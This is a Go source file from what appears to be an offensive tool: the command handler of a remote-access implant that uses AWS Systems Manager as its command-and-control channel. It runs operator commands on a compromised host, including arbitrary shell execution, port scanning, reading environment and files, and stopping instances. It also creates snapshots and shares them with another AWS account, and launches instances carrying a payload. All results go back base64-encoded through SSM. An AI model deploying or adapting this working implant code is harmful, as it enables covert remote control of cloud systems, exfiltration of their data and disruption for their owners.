package implantrun

import (
	"bytes"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/grines/ssmmm/awsrsa"
	"github.com/grines/ssmmm/awsssm"
	"github.com/grines/ssmmm/implant/cat"
	"github.com/grines/ssmmm/implant/implantaws"
	"github.com/grines/ssmmm/implant/implantchmod"
	"github.com/grines/ssmmm/implant/implantcp"
	"github.com/grines/ssmmm/implant/implantcurl"
	"github.com/grines/ssmmm/implant/implantenv"
	"github.com/grines/ssmmm/implant/implantexec"
	"github.com/grines/ssmmm/implant/implantkill"
	"github.com/grines/ssmmm/implant/implantls"
	"github.com/grines/ssmmm/implant/implantmkdir"
	"github.com/grines/ssmmm/implant/implantmv"
	"github.com/grines/ssmmm/implant/implantps"
	"github.com/grines/ssmmm/implant/implantutil"
	"github.com/grines/ssmmm/implant/portscan"
	"github.com/grines/ssmmm/implant/pwd"
	"github.com/grines/ssmmm/implant/wd"
	"github.com/grines/ssmmm/implant/whoami"
)

var history []string

var channel string

func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managedInstanceID string, instanceRegion string, c2 string) error {
	channel = c2
	commandStr = strings.TrimSuffix(commandStr, "\n")
	arrCommandStr := strings.Fields(commandStr)
	if len(arrCommandStr) < 1 {
		return errors.New("")
	}
	check := commandRan(cmdid)
	if !check {
		switch arrCommandStr[0] {
		//AWS SDK
		case "describe-instances":
			sess := GetSession("meta", instanceRegion)
			var ec2data []string

			var profile string
			var volumes []string
			ec2s := implantaws.DescribeInstances(sess)
			if len(ec2s) > 0 {
				for _, e := range ec2s {
					for _, i := range e.Instances {
						if i.IamInstanceProfile != nil {
							profile = *i.IamInstanceProfile.Arn
						} else {
							profile = ""
						}
						if i.BlockDeviceMappings != nil {
							for _, v := range i.BlockDeviceMappings {
								volumes = append(volumes, *v.Ebs.VolumeId+":"+*v.DeviceName)
							}
						}
						ec2data = append(ec2data, "InstanceID: "+*i.InstanceId+"\n"+"ImageId: "+*i.ImageId+"\n"+"IamInstanceProfile: "+profile+"\n"+"PrivateIpAddress: "+*i.PrivateIpAddress+"\n"+"State: "+*i.State.Name+"\n"+"SubnetId: "+*i.SubnetId+"\n"+"VpcId: "+*i.VpcId+"\n"+"Volumes: "+strings.Join(volumes, ",")+"\n")
					}
				}
				fmt.Println(ec2data)
				validateCommand(cmdid, tokens, managedInstanceID, strings.Join(ec2data, "\n---\n"), instanceRegion)
			}

		case "create-volume-from-snapshot":
			if len(arrCommandStr) > 2 {
				snapid := arrCommandStr[1]
				zone := arrCommandStr[2]
				sess := GetSession("meta", instanceRegion)
				volumeid := implantaws.CreateVolumeFromSnapshot(sess, snapid, zone)
				validateCommand(cmdid, tokens, managedInstanceID, volumeid, instanceRegion)
			}
		case "stop-instance":
			if len(arrCommandStr) > 1 {
				sess := GetSession("meta", instanceRegion)

				instid := arrCommandStr[1]
				implantaws.StopInstance(sess, instid)
				validateCommand(cmdid, tokens, managedInstanceID, "Stopped", instanceRegion)
			}
		case "start-instance":
			if len(arrCommandStr) > 1 {
				sess := GetSession("meta", instanceRegion)

				instid := arrCommandStr[1]
				implantaws.StartInstance(sess, instid)
				validateCommand(cmdid, tokens, managedInstanceID, "Started", instanceRegion)
			}
		case "detach-volume":
			if len(arrCommandStr) > 2 {
				sess := GetSession("meta", instanceRegion)

				volid := arrCommandStr[1]
				instid := arrCommandStr[2]
				data := implantaws.DetachVolume(sess, volid, instid)
				validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
			}
		case "attach-volume":
			if len(arrCommandStr) > 2 {
				sess := GetSession("meta", instanceRegion)

				volid := arrCommandStr[1]
				instid := arrCommandStr[2]
				data := implantaws.AttachVolume(sess, volid, instid)
				validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
			}
		case "create-snapshot":
			if len(arrCommandStr) > 1 {
				sess := GetSession("meta", instanceRegion)

				volid := arrCommandStr[1]
				data := implantaws.CreateSnapshot(sess, volid)
				validateCommand(cmdid, tokens, managedInstanceID, data.GoString(), instanceRegion)
			}
		case "modify-snapshot-attribute":
			if len(arrCommandStr) > 2 {
				sess := GetSession("meta", instanceRegion)

				snapid := arrCommandStr[1]
				acctid := arrCommandStr[2]
				data := implantaws.ModifySnapshotAttribute(sess, snapid, acctid)
				validateCommand(cmdid, tokens, managedInstanceID, data.GoString(), instanceRegion)
			}
		case "create-instance":
			if len(arrCommandStr) > 2 {
				sess := GetSession("meta", instanceRegion)

				ami := arrCommandStr[1]
				payload := arrCommandStr[2]
				data := implantaws.CreateInstance(sess, ami, payload)
				validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
			}
		//Commands
		case "ps":
			procs := implantps.Ps()
			validateCommand(cmdid, tokens, managedInstanceID, strings.Join(procs[:], "\n"), instanceRegion)
		case "env":
			data := implantenv.Env()
			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
		case "whoami":
			user, _ := whoami.Whoami()
			validateCommand(cmdid, tokens, managedInstanceID, user.Username, instanceRegion)
		case "pwd":
			data, _ := pwd.Pwd()
			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
		case "portscan":
			data := portscan.Portscan()
			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
		case "ls":
			var path string
			if len(arrCommandStr) == 1 {
				path = "./"
			} else {
				path = arrCommandStr[1]
			}
			list := implantls.Ls(path)
			data := strings.Join(list, "\n")
			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
		case "cat":
			data := cat.Cat(arrCommandStr[1])
			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
		case "cp":
			data, err := implantcp.Copy(arrCommandStr[1], arrCommandStr[2])
			if err == nil {
				validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
			}
		case "mv":
			var args implantmv.Arguments
			args.SourceFile = arrCommandStr[1]
			args.DestinationFile = arrCommandStr[2]
			data := implantmv.Mv(args)
			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
		case "curl":
			data := implantcurl.Curl(arrCommandStr[1])
			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
		case "chmod":
			intVar, _ := strconv.Atoi(arrCommandStr[2])
			implantchmod.Chmod(arrCommandStr[1], intVar)
			validateCommand(cmdid, tokens, managedInstanceID, "", instanceRegion)
		case "exec":
			var args []string
			awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
			args = arrCommandStr[2:]
			data := implantexec.Exec(arrCommandStr[1], args)
			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
		case "cd":
			if len(arrCommandStr) > 1 {
				os.Chdir(arrCommandStr[1])
				validateCommand(cmdid, tokens, managedInstanceID, wd.WorkingDir(), instanceRegion)
				awsssm.UpdateInstanceInformation(tokens, managedInstanceID, instanceRegion)
			}
			return nil
		case "killimplant":
			os.Exit(0)
		case "kill":
			data := implantkill.Kill(arrCommandStr[1])
			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
		case "mkdir":
			data := implantmkdir.Mkdir(arrCommandStr[1])
			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
		default:
			fmt.Println(arrCommandStr)
			cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
			var out bytes.Buffer
			var stderr bytes.Buffer
			cmd.Stdout = &out
			cmd.Stderr = &stderr
			err := cmd.Run()
			if err != nil {
				erout := fmt.Sprint(err) + ": " + stderr.String()
				validateCommand(cmdid, tokens, managedInstanceID, erout, instanceRegion)
				return nil
			}
			validateCommand(cmdid, tokens, managedInstanceID, out.String(), instanceRegion)
			return nil
		}
	}
	return nil
}

func validateCommand(cmdid string, tokens awsrsa.AwsToken, managedInstanceID string, data string, instanceRegion string) {
	if channel == "docs" {
		awsssm.SendCommandOutputDocs(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
		commandAdd(cmdid)
	}
	if channel == "messages" {
		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
	}

}

func commandAdd(cmd string) {

	history = append(history, cmd)
}

func commandRan(cmd string) bool {

	return contains(history, cmd)
}

func contains(s []string, str string) bool {
	for _, v := range s {
		if v == str {
			return true
		}
	}

	return false
}

func GetSession(kind string, region string) *session.Session {
	if kind == "meta" {
		sess, _ := session.NewSession(&aws.Config{
			Region: aws.String(region),
		})
		return sess
	} else {
		sess, _ := session.NewSessionWithOptions(session.Options{
			Profile: "paulg",
			Config:  *aws.NewConfig().WithRegion(region),
		})
		return sess
	}
}
